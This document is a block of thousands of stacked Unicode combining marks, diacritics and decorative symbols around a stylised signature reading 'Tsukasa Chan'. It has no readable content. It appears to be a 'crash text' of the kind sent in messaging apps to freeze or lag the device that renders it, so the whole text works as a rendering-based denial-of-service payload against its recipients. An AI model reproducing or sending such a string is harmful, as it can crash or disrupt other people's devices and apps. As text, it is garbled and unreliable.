ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝